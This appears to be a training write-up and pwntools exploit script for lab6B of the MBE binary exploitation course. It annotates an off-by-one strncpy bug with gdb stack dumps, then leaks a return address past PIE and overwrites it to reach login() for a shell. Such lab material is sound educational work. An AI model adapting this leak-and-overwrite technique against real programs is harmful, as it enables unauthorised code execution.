# -*- coding: utf-8 -*-
# Host the lab6B:
'''
socat TCP-LISTEN:4444,reuseaddr,fork, EXEC:'./lab6B'
'''

# Security - ASLR/NX/PIE/RELRO - ON
'''
❯ checksec lab6B
[*] '/home/karmaz/MBE/6_ASLR/lab6B'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# Fill the buffer with 32 x A's and watch last K
'''
❯ ./lab6B
----------- FALK OS LOGIN PROMPT -----------
Enter your username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter your password: 
Authentication failed for user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK
'''

# K is the result of hashing function used:
'''
"A" ^ "\n" = K
0x41 ^ 0x0a = 0x4b
'''

# 32B of username and 32B of password:
# strncpy() will read bytes till the first occurance of the 0x00 byte and load it into the readbuff.
'''
❯ ./lab6B
----------- FALK OS LOGIN PROMPT -----------
Enter your username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter your password: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Authentication failed for user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������
'''
# Then bytes will be xored by hash(), first 32bytes of username (AAA...) with first 32 bytes of password (BBB...)
# The rest will be xored with (A^B) x32 (xored username with password) - thats why there are some strange bytes after "AAAAAA" 
# It is because username and password do not contain a terminating null-byte

# Vulnerabilities - one off byte:
'''
strncpy(username, readbuff, sizeof(username));
strncpy(password, readbuff, sizeof(password));
'''

# Vulnerability patch:
'''
username[sizeof(username)-1] = '\0';
password[sizeof(password)-1] = '\0';
'''

# Stack after second strncpy()
'''
gdb-peda$ b *(login_prompt+252)
Breakpoint 1 at 0x187f
gdb-peda$ x/100wx $esp
0xffffcc50:     0xffffcd08      0xffffcc68      0x00000020      0x56556796  <== 0x56556796 <+19>:    add    ebx,0x27ee
0xffffcc60:     0x00000001      0x5655714c      0x42424242      0x42424242
0xffffcc70:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcc80:     0x42424242      0x42424242      0x0000000a      0x00000000
0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcca0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffccb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffccc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffccd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcce0:     0x00000000      0x00000000      0x41414141      0x41414141  <== copied input (AAA)
0xffffccf0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcd00:     0x41414141      0x41414141      0x42424242      0x42424242  <== copied input (BBB)
0xffffcd10:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd20:     0x42424242      0x42424242      0xffffffff      0xfffffffe  <== 0xffffffff - result  0xfffffffe - attempts 
0xffffcd30:     0xf7fa7000      0x56558f84      0xffffce48      0x565569aa  <<== RET addr main+184 - just after the: 0x565569a5 <+179>:   call   0x56556783 <login_prompt>
0xffffcd40:     0x0000001b      0x5655b2f0      0x00000002      0x00000000
0xffffcd50:     0x00000001      0xffffce14      0x5655b2f0      0x0000001b
0xffffcd60:     0xffffcd80      0x00000000      0x00000000      0xf7ddaee5
0xffffcd70:     0xf7fa7000      0xf7fa7000      0x00000000      0xf7ddaee5
'''

# Stack after hash():
'''
0xffffcdb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcdc0:     0x00000000      0x00000000      0x41414141      0x41414141
0xffffcdd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcde0:     0x41414141      0x41414141      0x03030303      0x03030303 <== hashed BBB
0xffffcdf0:     0x03030303      0x03030303      0x03030303      0x03030303
0xffffce00:     0x03030303      0x03030303      0xfcfcfcfc      0xfcfcfcfd <== hash() works furtherer till the 0xf7fa7000 because of the null byte - rest is xored with 0x03
0xffffce10:     0xf7fa7000      0x56558f84      0xffffce48      0x565569aa <<== hash() works till the 0xf7fa7000 and RET addr is untouched
0xffffce20:     0x0000001b      0x5655b2f0      0x00000002      0x00000000
'''
# Workaround for null byte is to compile lab with -static flag and attach the gdb to running process
'''
0xffffcda0:     0x00000000      0x00000000      0x41414141      0x41414141
0xffffcdb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcdc0:     0x41414141      0x41414141      0x78787878      0x78787878
0xffffcdd0:     0x78787878      0x78787878      0x78787878      0x78787878
0xffffcde0:     0x78787878      0x78787878      0xffffffff      0xfffffffe
0xffffcdf0:     0x0810af74      0x0810af74      0xffffce28      0x0804a574 <== RET after -static compilation
'''
# break @ hash()
'''
0xffffcd9a:     0x00000000      0x00000000      0x00000000      0x41410000
0xffffcdaa:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcdba:     0x41414141      0x41414141      0x41414141      0x39394141
0xffffcdca:     0x39393939      0x39393939      0x39393939      0x39393939
0xffffcdda:     0x39393939      0x39393939      0x39393939      0xc6c63939
0xffffcdea:     0xc6c7c6c6      0x964dc6c6      0x964d3129      0xf7113129
0xffffcdfa:     0x9c4dc6c6      0x0022313d      0x04700000      0x00020811
'''
# RET is +20 bytes from password 32 byte
'''
0x0804a574
>>> hex(0x08 ^ 0x39)
'0x31'
>>> hex(0x04 ^ 0x39)
'0x3d'
>>> hex(0xa5 ^ 0x39)
'0x9c'
>>> hex(0x74 ^ 0x39)
'0x4d'
==> 0x313d9c4d

0x0022313d and 0x9c4dc6c6 ==> 0x313d9c4d
'''

# The plan is to leak the RET addr in first run and use it in the second run with payload xored to overwrite RET to point @ login() and get a shell.
from pwn import *
context.log_level = 'debug'
p = process("./lab6B")
#p = remote('localhost', 4444)
#gdb.attach(p,'''
#set disable-randomization off
#set follow-fork-mode child
#set disassembly-flavor intel
#break *(login_prompt+271)
#c
#x/144wx $esp''')

def send_creds(username,password):
    p.recvuntil("Enter your username: ")
    p.sendline(username)
    p.recvuntil("Enter your password: ")
    p.sendline(password)

# First part - leak RET addr 
username = "A" * 32
password = "x" * 32
send_creds(username,password)

leak = p.recvline()
attempts = u32(leak[0x63:0x67]) # attmepts 
ret = u32(leak[0x73:0x77]) # unicode little endian return addr
log.info("XORED RET: " + str(hex(ret)))
ret_clean = (ret^0x39393939) # Reverse xoring to get ret value 
log.info("RET VALUE: " + str(hex(ret_clean)))

# Second part - change RET to login() using relative addr and attempts to 
'''
gdb-peda$ p (main+184) - login
$3 = 0x464
''' 
ret2login = ret_clean - 0x464 # relative addr 

payload = "x" * 4 + "\x76" # change attempts from 0xfffffffe to 0xffffffff
payload += "x" *(20 - len(payload)) + p32(ret_clean ^ 0x39393939 ^ 0x41414141 ^ ret2login)
payload += "x" *(32 - len(payload))

send_creds(username,payload)
send_creds('a','a')
p.interactive()